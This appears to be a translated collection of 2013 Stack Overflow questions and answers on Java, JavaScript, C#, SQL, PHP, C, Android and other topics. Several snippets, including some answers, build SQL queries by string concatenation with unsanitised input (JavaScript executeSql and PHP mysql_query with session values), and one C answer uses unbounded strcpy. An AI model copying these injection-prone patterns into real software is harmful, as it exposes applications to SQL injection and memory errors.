> ID：15110937
> 
> 赞同：0
> 
> 时间：2013-02-27T11:26:52.423
> 
> 标签：java, session, zk

我正在为我的 zk 框架 6.5 应用程序使用 MVC 和 MVVM。现在我想在我的应用程序中创建和维护一个会话，但是我没有找到一个很好的例子，如何在不使用 spring security 的情况下在 zk 中创建和维护会话。

我有一个登录页面，我知道我可以获取用户名和密码并将用户移动到主页。但这不是我想要的。我想在这里创建和维护一个会话，并在会话中添加用户相关数据，以便我可以在任何地方的应用程序中使用它。

我阅读了以下指南
[实现 ZK MVC](http://books.zkoss.org/wiki/ZK_Essentials/Handling_the_Login_Process_using_ZK_MVC_and_Sessions/Implementing_ZK_MVC)
[使用 ZK 会话管理凭证](http://books.zkoss.org/wiki/ZK%20Essentials/Handling%20the%20Login%20Process%20using%20ZK%20MVC%20and%20Sessions/Managing%20credentials%20using%20ZK%20Sessions)

但是我无法在这里直接了解我的概念。

如果你给我一些使用实际代码的例子，那将会很有帮助。

目前我有登录页面，它的提交按钮带有空字段，我只是将用户重定向到主页。

MVC 模式会很棒。我已阅读 zk mvc 和 UserCredentialManager 文档。但我不确定如何使用这些信息。

还请分享 zk 和没有 spring 安全性的设计的最佳实践。

期待听到您的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:14:21.290

如果您只是想在用户会话中存储信息，使用 ZK 很容易：

```
Session session = Sessions.getCurrent();
session.setAttribute("my_stored_data", myStoredData); 
```

...

```
Session session = Sessions.getCurrent();
Object myStoredData = session.getAttribute("my_stored_data"); 
```

每个`Session`用户都自动存在，并由 ZK 为您维护。

希望有帮助。

# javascript - 在 Javascript 中访问嵌套函数

> ID：15110939
> 
> 赞同：1
> 
> 时间：2013-02-27T11:27:05.293
> 
> 标签：javascript, function

我有以下代码：

```
function getRetailerName(retailerID) {
    var retailerName;
    db.transaction(function retName(qry) {
        qry.executeSql("SELECT retailerName FROM retailers WHERE token = '" + retailerID + "' ", [], function (tx, results1) {
            var len1 = results1.rows.length;
            var retailerName;
            for (var i1 = 0; i1 < len1; i1++) {
                retailerName = results1.rows.item(i1).retailerName;
                //alert(results1.rows.item(i1).retailerName);
            }
        });
        return retailerName;
    });
    alert(retName());
} 
```

我试图从内部函数中获取值`retName()`并最终调用`getRetailerName()`以从数据库中获取值，但是它一直给我一个`retName`未定义的错误？

我在这里尝试了很多，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:30:02.747

你不能那样做，因为它是异步的。当您从函数返回时，查询尚未完成。相反，传递一个要执行的回调：

```
function getRetailerName(retailerID, callback) {
    var retailerName;
    db.transaction(function retName(qry) {
        qry.executeSql("SELECT retailerName FROM retailers WHERE token = '" + retailerID + "' ", [], function (tx, results1) {
            var len1 = results1.rows.length;
            var retailerName;
            for (var i1 = 0; i1 < len1; i1++) {
                retailerName = results1.rows.item(i1).retailerName;
                callback(retailerName);
            }
        });
    });
}

getRetailerName(1, function(name) {
    alert(name);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:31:26.337

您不能（因为`retName`命名函数表达式仅在其中可用）并且您不应该尝试这样做（因为函数是异步的并且它不起作用）。相反，使用回调：

```
function getRetailerName(retailerID, callback) {
    var retailerName;
    db.transaction(function retName(qry) {
        qry.executeSql("SELECT retailerName FROM retailers WHERE token = '" + retailerID + "' ", [], function (tx, results1) {
            var len1 = results1.rows.length;
            for (var i1 = 0; i1 < len1; i1++) {;
                callback(results1.rows.item(i1).retailerName);
            }
        });
    });
}

getRetailerName(1, alert.bind(window)); 
```

# c# - 如何将项目添加到方法内部的 Observable 集合中？

> ID：15110941
> 
> 赞同：1
> 
> 时间：2013-02-27T11:27:15.170
> 
> 标签：c#, wpf, observablecollection

我无法将项目添加到方法内的 Observable 集合中。

下面是一段代码：

*   我将首先调用 GetFeaturelist() 方法，在这里它返回可观察的集合，然后我将调用 AddRange 它应该在 GetFeaturelist() 方法中将项目添加到 FeatureList 中，而这并没有发生。

请帮我解决这个问题。

```
GetFeaturelist().AddRange(_featureListBuffer);

private ObservableCollection<Feature> GetFeaturelist()
{
   return FeatureList;
}

public class ObservableCollection<T> :    System.Collections.ObjectModel.ObservableCollection<T>
{
    /// <summary> 
    /// Adds the elements of the specified collection to the end of the ObservableCollection.
    /// </summary> 
    public void AddRange( IEnumerable<T> collection )
    {
        foreach( T i in collection )
        {
            Items.Add( i );
        }

        OnCollectionChanged( new NotifyCollectionChangedEventArgs( NotifyCollectionChangedAction.Reset ) );
    }
} 
```

笔记：

*   我能够这样做 `FeatureList.AddRange(_featureListBuffer);` 并且工作正常但我想要这样 `GetFeaturelist().AddRange(_featureListBuffer);`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:35:29.603

您的代码看起来完全有效，应该可以正常工作。

我能想到的唯一一件事是您可能会遇到名称冲突：您的“ObservableCollection”与您从中派生的基本“ObservableCollection”具有完全相同的名称。这很容易出现各种拼写错误和错误导入。

如果在您定义的地方`private ObservableCollection<Feature> GetFeaturelist()`有`using System.Collections.ObjectModel`，那么方法签名实际上可能认为它返回 BASE o-coll，而不是您可能想要的派生的。在这种情况下，代码将无法编译，错误窗口应该清楚地说明问题所在。

首先，在方法定义的地方检查使用情况。如果它们是正确的，并且代码编译正确，那么在调用站点放置断点并检查实际使用的集合。然后，如果您仍然有问题，请使用这些数据更新您的帖子。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-06-12T08:50:00.070

`ObervableCollection`不支持`AddRange()`方法。

# sql - 透视 SQL Server 2008 问题

> ID：15110943
> 
> 赞同：-3
> 
> 时间：2013-02-27T11:27:26.117
> 
> 标签：sql, sql-server, sql-server-2008, pivot

我在 SQL Server 2008 中创建了以下查询

```
SELECT dimUser.EmpFName, dimUser.EmpLName, dimUser.EmpStartDt, dimUser.MgrEmpFullName1, 
    dimUser.PrimaryJobName, dimUser.PrimaryOrgName, Org.Org_Name
FROM dimUser 
INNER JOIN tblEmpOrg AS fact 
  ON dimUser.ID = fact.EmpOrg_EmpFK 
INNER JOIN Org 
  ON fact.EmpOrg_OrgFK = Org.Org_PK 
```

数据产生多行，因为每个用户有许多不同的组织名称。

```
Employee Name  Manager Name          Org_Name
Neil Jones     Elizabeth O'Donnell   USA 
Neil Jones     Elizabeth O'Donnell   AFG 
Neil Jones     Elizabeth O'Donnell   USA REG A 
```

如何旋转此查询以为不同的组织生成多个列。IE 组织 1、组织 2、组织 3 等。

```
Employee Name  Manager Name         Org_NAME 1  Org_Name 2  Org_Name 3
Neil Jones     Elizabeth O'Donnell  USA         AFG         USA REG A 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T11:31:40.667

您可以使用该[`PIVOT`](http://msdn.microsoft.com/en-us/library/ms177410%28v=sql.105%29.aspx)函数来转换数据。但是，您将希望向`row_number()`每个员工申请以帮助将行数据转换为列。

如果每个员工都有已知数量的值，则可以对查询进行硬编码，如下所示：

```
select [Employee Name],
  [Manager Name],
  Org_Name_1, 
  Org_Name_2, 
  Org_Name_3
from
(
  select [Employee Name], [Manager Name], [Org_Name],
    'Org_Name_'+cast(row_number() over(partition by [Employee Name] order by [Employee Name]) as varchar(50)) rn
  from yourtable
) src
pivot
(
  max([Org_Name])
  for rn in (Org_Name_1, Org_Name_2, Org_Name_3)
) piv; 
```

请参阅[带有演示的 SQL Fiddle](http://www.sqlfiddle.com/#!3/d255a/2)

但是，如果`org_name`每个员工的值数量未知，则需要使用动态 SQL：

```
DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX)

select @cols = STUFF((SELECT distinct ',' + QUOTENAME(rn) 
                    from
                    (
                      select 'Org_Name_'+cast(row_number() over(partition by [Employee Name] order by [Employee Name]) as varchar(50)) rn
                      from yourtable
                    ) t
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

set @query = 'SELECT [Employee Name], [Manager Name],' + @cols + ' from 
             (
                select [Employee Name], [Manager Name], [Org_Name],
                  ''Org_Name_''+cast(row_number() over(partition by [Employee Name] order by [Employee Name]) as varchar(50)) rn
                from yourtable
            ) x
            pivot 
            (
                max(Org_Name)
                for rn in (' + @cols + ')
            ) p '

execute(@query) 
```

请参阅[带有演示的 SQL Fiddle](http://www.sqlfiddle.com/#!3/7c2a3/1)

两者都生成结果：

```
| EMPLOYEE NAME |        MANAGER NAME | ORG_NAME_1 | ORG_NAME_2 | ORG_NAME_3 |
------------------------------------------------------------------------------
|    Neil Jones | Elizabeth O'Donnell |        USA |        AFG |  USA REG A | 
```

*注意：`yourtable`用您的查询替换*

# jquery - 单击按钮时，带有关键字 $(this) 的行不起作用 - jQuery

> ID：15110944
> 
> 赞同：1
> 
> 时间：2013-02-27T11:27:26.450
> 
> 标签：jquery

```
var undoButton = $('<input type="button" id="undoBtn" value="UndoSelection">').addClass('button');
        $(windowContainer).append(undoButton);
        $(undoButton).click(function(){
            var seat = $('<img/>',{src:'gfx/seat.png'});
            var seatYellow = $('<img/>',{src:'gfx/seat_yellow.png'});
            if(($('td').hasClass('p')) && ($('td').hasClass('picked'))){  
                **$(this).html(seatYellow);**                                   
            } else if (($('td').hasClass('n')) && ($('td').hasClass('picked'))){
                **$(this).html(seat);**
            }

        }) 
```

行`$(this).html(seatYellow)`和`$(this).html(seat)`不工作。`(this)`当我用 if 语句的`('td')`第一部分替换单词时，很明显，因为它返回 true。然而，这不是我想要的。我希望将特定的 td 元素替换为`seat`or `seatYellow`，这就是我使用的`(this)`原因。由于某种原因，它不起作用。有任何想法吗？先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:34:08.703

试试这个：

```
$(windowContainer).on('click', undoButton, function() { 
```

或者这样：

```
$(windowContainer).on('click', '.button', function() { 
```

或`delegate the event to document`：

```
$(document).on('click', undoButton, function() { 
```

或这个：

```
$(document).on('click', '.button', function() { 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:58:28.077

考虑一下您要将带有图像数据的 html 应用到哪里。目前，您正尝试将图像添加到值为 undoButton 的输入标记中。

您需要记住对要添加座位的元素的引用。

```
var el = $(this);
var undoButton = $('<input type="button" id="undoBtn" value="UndoSelection">').addClass('button');
$(windowContainer).append(undoButton);
$(undoButton).click(function(){
    var seat = $('<img/>',{src:'gfx/seat.png'});
    var seatYellow = $('<img/>',{src:'gfx/seat_yellow.png'});

    if(($('td').hasClass('p')) && ($('td').hasClass('picked'))){  
        el.html(seatYellow);                                 
    } else if (($('td').hasClass('n')) && ($('td').hasClass('picked'))){
        el.html(seat);
    }
}); 
```

最好将类应用到当前座位并将图像设置为背景图像，具体取决于它是普通座位还是黄色座位。

# colors - 以编程方式为某些区域着色

> ID：15110945
> 
> 赞同：0
> 
> 时间：2013-02-27T11:27:27.927
> 
> 标签：colors, bitmap, drawing

我想编写一个算法，允许我在绘图的定界区域中填充颜色。我给你看一个例子：

前 ![在此处输入图像描述](../Images/e17131568ba654e95636690fc24c1f4f.png)

后

![在此处输入图像描述](../Images/1f25ebfd120936531a052cd6ce5eb557.png)

开始这个算法的方法是什么？我在哪里可以采取行动来实现这个功能？或者有什么做的吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:29:46.180

[http://en.wikipedia.org/wiki/Flood_fill](http://en.wikipedia.org/wiki/Flood_fill)浮现在脑海，但我不认为这是最好的答案......

另请注意，如果您使用 microsoft paint 或其他成像软件放大图像，您可能会注意到存在使此技术更加棘手的模糊，理想情况下，此技术适用于更清晰锐利的像素边界。

大多数形状绘制子例程默认情况下允许填充形状，但是您要问的有点棘手。

特别是，我通常会绘制一个填充形状，然后绘制一个与填充形状相同的未填充形状，但边框颜色不同，模拟您想要做的事情。

我的意思是伪代码

```
 setcolor(backgroundcolor); 
 fillrect(0, 0, width, height);

 setcolor(roofcolor); 
 filltriangle(x1, y1, x2, y2, x3, y3);
 setcolor(black); 
 drawtriangle(x1, y1, x2, y2, x3, y3);

 ... so on 
```

# php - 如何在输入字段中附加 id？

> ID：15110950
> 
> 赞同：-2
> 
> 时间：2013-02-27T11:27:43.683
> 
> 标签：php, html

如何在输入字段中附加 id 并在 PHP 中的其他页面上发送？

```
<input type="text" size="3" name="new_quantity[]" value="<?php echo $product_quantity; ?>" /> 
```

有什么帮助吗？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:29:11.357

尝试这个 ：

```
<input type="text" size="3" name="new_quantity[<?php echo $product_id; ?>]" value="<?php echo $product_quantity; ?>" /> 
```

改变：`name="new_quantity[<?php echo $product_id; ?>]"`

在另一页

`print_r($_REQUEST['new_quantity']);`

您可以将`product_id`其视为输入字段的键和`value`值。

# iphone - 如何使用 Objective-C 代码退出 iPhone 应用程序？

> ID：15110952
> 
> 赞同：-6
> 
> 时间：2013-02-27T11:27:48.007
> 
> 标签：iphone, objective-c

我需要在不使用主页按钮的情况下退出应用程序。我调用 exit(0) 方法正在工作。这是退出应用程序或任何问题的正确方法吗？如果有其他退出应用程序的方法？. 请帮我..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:47:31.587

**`any another way to exit application?`**

在您的应用程序 plist 文件中添加`Application does not run in background`键并设置其值。`YES`当您的用户按下主页按钮时，应用程序将关闭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:30:31.490

您可以使用`abort();`或引发 NSException ，这将导致应用程序崩溃。

以编程方式退出应用程序不是推荐的行为，您应该向用户显示警报，说明您的应用程序需要退出的原因，并告诉用户他如何退出您的应用程序以使其看起来不就像您的应用程序有问题一样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:49:51.463

```
iOS Human Interface Guidelines says Don't Quit Programmatically. we have seen many of apps that had calls to exit(0) previously.
    Apple provided the different stages to exit the app. For that they provided different methods. So by exit() code its not proper to exit the app since the app will get rejected by Apple.
    you can refer this Apple Doc at http://developer.apple.com/library/ios/#documentation/UserExperience/Conceptual/MobileHIG/UEBestPractices/UEBestPractices.html#//apple_ref/doc/uid/TP40006556-CH20-SW27 
```

# jquery - Dynatree 用于加载

> ID：15110953
> 
> 赞同：1
> 
> 时间：2013-02-27T11:27:48.410
> 
> 标签：jquery, dynatree

我正在使用 NODE 选项 expand = false 创建一个动态树。但是当我查看树时，它会在开始时显示所有已花费的内容。如何在初始阶段获得所有崩溃的树。下面是我的代码

```
$(function(){
            // Attach the dynatree widget to an existing <div id="tree"> element
            // and pass the tree options as an argument to the dynatree() function:
            $("#tree").dynatree({
                onActivate: function(node) {
                    // A DynaTreeNode object is passed to the activation handler
                    // Note: we also get this event, if persistence is on, and the page is reloaded.
                    //alert("You activated " + node.data.key);
                },
                persist: false,
                checkbox: true,
                generateIds: false,

                classNames: {
                    checkbox: "dynatree-checkbox",
                    expanded: "dynatree-expanded"
                },
                selectMode: 3,
                children: {!JsonString},
                onSelect: function(select, node) {
                    // Get a list of all selected nodes, and convert to a key array:
                    var selKeys = $.map(node.tree.getSelectedNodes(), function(node){
                        return node.data.key;
                    });
                    jQuery(document.getElementById("{!$Component.selectedKeys}")).val(selKeys.join(", "));

                    // Get a list of all selected TOP nodes
                    var selRootNodes = node.tree.getSelectedNodes(true);
                    // ... and convert to a key array:
                    var selRootKeys = $.map(selRootNodes, function(node){
                        return node.data.key;
                    });
                },

            });

        }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T08:17:12.403

在我的 dynatree 中，我在 init 上使用 AJAX 并展开整个树，但也许对我的代码的这种修改会对您有所帮助：

```
onPostInit: function(isReloading, isError) {
    this.$tree.dynatree('getRoot').visit(function(node){
        node.expand(false);
    });
} 
```

# sql - 在更新后触发器中跟踪对文本列的更新

> ID：15110957
> 
> 赞同：0
> 
> 时间：2013-02-27T11:27:57.480
> 
> 标签：sql, sql-server, triggers

我有一个在 SQL-Server 2000 中设计但在 SQL-Server 2008 中运行的数据库。其中一个表有一个`TEXT`带有注释的列，我需要跟踪对此列所做的更改数量。

目前有一个触发器从插入的值插入：

```
ALTER TRIGGER [dbo].[NotesEdited] 
   ON  [dbo].[NOTESTABLE] 
   AFTER UPDATE
AS 
BEGIN

SET NOCOUNT ON;

DECLARE @UserID VarChar(4);
DECLARE @DateEdited datetime;
DECLARE @NotesAfter varchar(max);
DECLARE @PRIMARY float;

SELECT @UserID = user_edited FROM inserted;
SELECT @PRIMARY = note_primary FROM inserted;
SELECT @DateEdited = GetDate();
SELECT @NotesAfter = (select note from NOTESTABLE where note_primary = @PRIMARY)

IF UPDATE(note)

    BEGIN

        insert into NotesEditHistory (DateEdited,NotesAfter,UserID) values(@DateEdited,@NotesAfter,@UserID)

    END 

END 
```

最大的问题是软件对表执行了 2 到 10 次更新，其中只有一次对`note`字段进行了更改，但会导致 2-10 次插入到表中。

我认为这可以使用该行解决，`IF UPDATE(note)`但似乎每次更新都在运行，`IF UPDATE(<FIELD>)`总是验证为真，我想这与正在使用的软件有关。

**64,000 美元* 问题：**

`text`如果我无法访问列的`deleted`or`inserted`值，如何在更新后触发器中测试列的更新？

在您问之前，我无法更改列类型。

**不是真正的奖品*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:46:20.677

如果它们不相等，`NotesEditHistory.NotesAfter`您可以比较最后一个并插入`Note`

# c++ - 在 wxString 中像 & 一样读取 NRC

> ID：15110958
> 
> 赞同：0
> 
> 时间：2013-02-27T11:28:07.517
> 
> 标签：c++, html, parsing, wxwidgets

我正在尝试使用 wxWidgets 读取 xml 文件。通常，文件中的文本会被完全解析。所以这就`&amp;`变成了`&`等等。

如果我解码一些文本，因为它是 base64，仍然所有转义都被完全解析。现在我想要一个字符串`wxT("&amp")`也显示为`"&"`. 有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:36:16.290

You search the string for the `"&amp;"` and replace it with `"&"`.

If using [`std::string`](http://en.cppreference.com/w/cpp/string/basic_string) this can be done with the [`find`](http://en.cppreference.com/w/cpp/string/basic_string/find) and [`replace`](http://en.cppreference.com/w/cpp/string/basic_string/replace) methods.

# python - python audiotools挂在get_metadata（）

> ID：15110959
> 
> 赞同：0
> 
> 时间：2013-02-27T11:28:12.627
> 
> 标签：python, audio

我正在尝试读取此文件的元数据

```
http://wormtune.com/test/1.mp3 
```

使用 python 2.7 和 audiotools 2.19。

```
import audiotools
a = audiotools.open('/tmp/1.mp3')
a.get_metadata() # <-- dead hanging 
```

python正在使用100％的cpu并且什么都不做......这是怎么回事？如何防止挂起？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-09T21:14:33.123

该代码似乎有效。我在本地有两个文件（一个是 flac，另一个是 mp3），它们可以打印元数据。但是当我尝试您的文件时，它会引发错误“UnsupportedFile”。

也许您可以尝试 except block 以避免阻塞。

我正在使用最新的音频工具和 python 2.7。

# c - 从函数返回局部变量在两种情况下会给出不同的输出。

> ID：15110961
> 
> 赞同：2
> 
> 时间：2013-02-27T11:28:26.917
> 
> 标签：c

```
#include <stdio.h>
char* fun1()
{
  char *s="hello";
  return s;
} 
char* fun2()
{
  char s[6]="hello";
  return s;
}
main()
{
  char *str;
  str = fun1();
  printf("%s",str);//hello
  str = fun2();
  printf("%s",str);//garbage value
} 
```

代码的输出是 - 你好和一些垃圾。我不明白虽然 fun1 和 fun2 中的两个变量都是它们各自函数的本地变量，但为什么输出会这样。两个函数调用都返回局部变量的地址，并且返回的地址应该包含垃圾值，这在 fun1 情况下不正确，因为它正在打印“你好”。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T11:29:36.163

因为在第二种情况下，对象存在于堆栈中，`fun2`而在第一种情况下，它存在于某个固定区域。一旦调用`fun2`结束，它就会超出范围，即它会死掉。

> 两个函数调用都返回局部变量的地址

实际上在堆栈上的`fun1`只是**一个指针，而不是内容本身**。所以你返回**一个指针**，指向一个保证在程序结束之前一直存在的东西——一个字符串文字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:31:41.250

在第二个函数中，您将返回指向局部变量的指针。

一旦 fun2() 调用完成，分配给 s[6] 的内存就会被释放，因此指针指向内存中的某个无效位置。

您可以按如下方式修改您的代码：

```
char* fun2(char *s)
{
    strcpy(s, "hello");
}

char str[6];
fun2(str);
printf("%s",str); 
```

现在 str[6] 变量是在 fun2() 之外分配的，所以当 fun2() 退出时，该变量的内存不会被释放。

* * *

编辑：请注意，上面的代码并不安全，因为 fun2() 不会检查或以任何方式控制它写入内存的字节数。

# dart - 用 dart 编写的网络爬虫

> ID：15110962
> 
> 赞同：-2
> 
> 时间：2013-02-27T11:28:30.767
> 
> 标签：dart

我有一种简单的方法可以在 dart 中编写 Web Crawler 吗？基本上我想抓取 AJAX 和非 AJAX 站点并从每个页面收集一些信息。html5lib 是实现它的一个选项吗？

提前致谢！拉文德拉

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T00:31:47.173

我不知道使用 Dart 构建的网络爬虫库。但是，所有的部分都应该在那里。Dart VM 可以连接到 HTTP 资源，您可以使用 HTML5Lib 来解析页面。

爬行 AJAX 需要 JavaScript 解释器。我不知道用 Dart 编写的 JavaScript 解释器，但您也许可以使用无头 Web 浏览器（如 DumpRenderTree）。

# android - 将 GoogleMap 作为参数传递给片段

> ID：15110967
> 
> 赞同：0
> 
> 时间：2013-02-27T11:28:51.657
> 
> 标签：android, google-maps

我的 Android 应用程序使用 Google Maps API V2 时遇到问题。

我有一个带有两个片段的 FragmentActivity。一个带有列表的片段和一个带有 GoogleMap 对象的片段。我想要实现的是从列表中操作地图。

在我的 FragmentActivity 中，我像这样启动我的地图片段：

```
customMapFragment = MapSectionFragment.newInstance(); 
```

在我的 FragmentActivity 中，我像这样启动我的 GoogleMap：

```
mMap = customMapFragment.getMap(); 
```

这个参考 - mMap - 是我想要传递给我的列表片段的内容，如下所示：

```
listSectionFragment = new ListSectionFragment(mMap); 
```

我想要这样做，以便我可以轻松地从 list-fragment 类中操作 map-fragment 上的特定地图。这是我的构造函数：

```
 public ListSectionFragment(GoogleMap mMap) {
    this.mMap = mMap;
} 
```

但是，这给了我错误/警告*“避免片段中的非默认构造函数：使用默认构造函数加上 Fragment#setArguments(Bundle) 代替”*

而且由于 GoogleMap 不可打包，我无法通过捆绑发送它。

如何在没有默认构造函数的情况下解决这个问题？

* * *

编辑：我正在压制警告，它似乎工作正常。但正如警告的解释告诉我的那样：*每个片段都必须有一个空的构造函数，因此在恢复其活动状态时可以实例化它。*

这会在某个时候因随机崩溃而反击我吗？最好的选择仍然是在没有默认构造函数的情况下解决问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T14:47:47.990

解决方案：

使用 onAttached 而不是默认构造函数。

像这样：

```
@Override
public void onAttach(Activity activity) {
    super.onAttach(activity);
    if(!(activity instanceof MainFragmentActivity))
        throw new ClassCastException(activity.toString()
                + " must be of type MainFragmentActivity");
    parent = (MainFragmentActivity) activity;
    this.mMap = parent.getMap();
} 
```

# java - Java中的URLDecode用于命名列表

> ID：15110969
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:28:56.957
> 
> 标签：java, list, jakarta-ee, collections

我需要解码（URLDecode.decode）命名列表中的每个对象。我尝试通过命名列表进行迭代

```
 for (NamedList nlst : allLists) {
  try {
Namedlist temp =(NamedList) UrlDecode.decode(nlst.toString(),"UTF-8");
} 
```

但它不允许我投进一个命名列表。

请让我知道如何实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:37:01.763

You cannot cast a String to custom defined class. Think about this way what you are going to do if you want to cast an Integer instance to a String, you will probably use static factory method valueOf() to **convert** Integer to a String rather than casting it.

So a workaround here is to provide your own static factory method in something like XXXUtil.java

```
public static NamedList valueOf(String s){
//TODO convert string to namedlist
} 
```

# php - MySQL 在查询 2 的结果中找到查询 1 的结果

> ID：15110970
> 
> 赞同：0
> 
> 时间：2013-02-27T11:29:01.613
> 
> 标签：php, mysql, checkbox

我有一个表格行程，所有行程都保存在其中。然后，我根据`$_SESSION`值将行程表中的所有这些数据提取到复选框数组中。

```
<?php
session_start(); 
require("aacfs.php");
echo"<div class='box' style='display:inline-block;' >
<table width='800'><tr><td>
  <table width=100 align=left class='hovertable' style='display:inline-block;'><tr><th align=center bgcolor=silver><font face=consolas>Choose Itinerary</font></th></tr>
    <tr>
      <td></br>
      <form method=post>"; 

$result=mysql_query("select * from itinerary where aircraft = '$_SESSION[rtyp]' group by location");
    $y=mysql_affected_rows();
    for($i=0;$i<$y;$i++)
    {$row=mysql_fetch_array($result);
        $pr=$row['icode'];
        $n=$row['location'];
        $l=$row['btime'];
echo"<table border=1 align=center width=250>
          <tr><td width=15>
          <input type='checkbox' value='$n -> $l'>
          </td><td>$n</td><td width=5>$l</td></tr>
          </table>";

        }
?> 
```

然后，我有另一个表，其中保存了先前选择的行程。我们称之为位置表。然后我想选择那里的所有数据，在我获取的上一个查询中找到它。如果找到，将自动选中该复选框。

因此，例如，我从行程表中获得了这些数据：

![在此处输入图像描述](../Images/150c9b2cf7393d13a512a78460f9a828.png)

然后我从位置表中获得这些数据：

![在此处输入图像描述](../Images/8e29919a2609a61db2da96503c5ce105.png)

应*检查*位置表中的值。意味着复选框数组上的`Cebu - Bohol`和`Bohol - Cebu`值应该被*选中*。我只是不知道如何使用查询来做到这一点。请帮我。谢谢。

**编辑：**我可以使用这段代码做我想做的事，

```
$result=mysql_query("select * from itinerary where aircraft = '$_SESSION[rtyp]' group by location");
    while($row=mysql_fetch_array($result))
    {
        $pr=$row['icode'];
        $n=$row['location'];
        $l=$row['btime'];
        $res=mysql_query("select * from location where reservno = '$_SESSION[rno]'") or die(mysql_error());
        while($row1=mysql_fetch_array($res))
        {
            $loc=$row1['location'];
            if($n==$loc)
            {
                echo"<table border=1 align=center width=250>
                <tr><td width=15>
                <input type='checkbox' value='$n -> $l' checked='yes'>
                </td><td>$n</td><td width=5>$l</td></tr>
                </table>";

                $t=$_POST['prod'];
            }
        elseif($n!=$loc)
        {
            echo"<table border=1 align=center width=250>
            <tr><td width=15>
            <input type='checkbox' value='$n -> $l'>
            </td><td>$n</td><td width=5>$l</td></tr>
            </table>";

            $t=$_POST['prod'];
        }
    }
    } 
```

但，

![在此处输入图像描述](../Images/605a86e2f98ae63093e599ffff781849.png)

如您所见，它与行程重复了两次。我怎样才能只回显一次行程？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:34:59.523

```
select i.*, l.location is not null as selected
from
    itinerary i
    left join
    location l on i.location = l.location
where aircraft = '$_SESSION[rtyp]'
group by location 
```

现在检查 PHP 代码中的 selected 是否为真。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:35:48.270

您是否尝试过使用[Inner Join](http://dev.mysql.com/doc/refman/5.0/en/join.html)。

试一试：

```
SELECT a.location, a.btime FROM table1 a 
INNER JOIN table2 b ON a.location = b.location 
```

顺便问一下，碧瑶在哪里？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-28T06:32:28.703

使用以下代码实现它：

```
$result=mysql_query("select * from itinerary where aircraft = '$_SESSION[rtyp]' group by location");
    while($row=mysql_fetch_array($result))
    {
        $pr=$row['icode'];
        $n=$row['location'];
        $l=$row['btime'];
        $res=mysql_query("select * from location where reservno = '$_SESSION[rno]'") or die(mysql_error());
        while($row1=mysql_fetch_array($res))
        {
            $loc=$row1['location'];
                if($n==$loc){$ctr="true"; break;}
                else{$ctr="false";}

        }
        if($ctr=="true"){
                echo"<table border=1 align=center width=250>
                <tr><td width=15>
                <input type='checkbox' value='$n -> $l' checked='yes'>
                </td><td>$n</td><td width=5>$l</td></tr>
                </table>";

                $t=$_POST['prod'];
            }
            else
            {
                echo"<table border=1 align=center width=250>
                <tr><td width=15>
                <input type='checkbox' value='$n -> $l'>
                </td><td>$n</td><td width=5>$l</td></tr>
                </table>";

                $t=$_POST['prod'];
            }

    } 
```

# google-maps - 如何以pdf格式下载从一个地方到另一个谷歌地图的路线？

> ID：15110971
> 
> 赞同：2
> 
> 时间：2013-02-27T11:29:07.303
> 
> 标签：google-maps, pdf, google-maps-api-3

我已经使用方向渲染器（）计算了 2 个地方的路线；现在我需要下载 pdf 格式的路线。可能吗。我的路线图代码是

```
var map = new google.maps.Map(document.getElementById("mapp"),myOptions);

latlng=new google.maps.LatLng(glat,glon);

$('#mapDiv1').modal({closeClass: "mapCloseImg"});

directionsDisplay.setMap(map);
directionsDisplay.setPanel(document.getElementById("panel"));
var request = {
  origin: acity,
  destination:latlng,
  travelMode: google.maps.DirectionsTravelMode.DRIVING
};

directionsService.route(request, function(response, status) {
  if (status == google.maps.DirectionsStatus.OK) {
    directionsDisplay.setDirections(response);
  }
}); 
```

# javascript - 即使我的链接位于页面底部，如何让我的工具提示出现在我的链接下方？

> ID：15110972
> 
> 赞同：0
> 
> 时间：2013-02-27T11:29:07.833
> 
> 标签：javascript, tooltip

我使用了图书馆[http://www.menucool.com/tooltip/javascript-tooltip](http://www.menucool.com/tooltip/javascript-tooltip)。

工具提示几乎完美无缺，我只有一个问题。当我的链接位于页面底部时，工具提示出现在他的上方而不是下方。工具提示和页面底部之间似乎存在间隙，但无论链接的位置如何，我都希望工具提示位于链接下方，即使工具提示会被页面底部剪切。用户将向下滚动，这没什么大不了的。

这是我的代码：

```
<a href="#" onmouseover="tooltip.pop(this, '#listToDisplay', {offsetY: -18})">Link</a> 
```

你有什么想法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:44:48.650

在这里参考tracevipin的评论是应该为你工作的代码

```
<a href="#" onmouseover="tooltip.pop(this, '#listToDisplay', {offsetY: -18, position:2})">Link</a> 
```

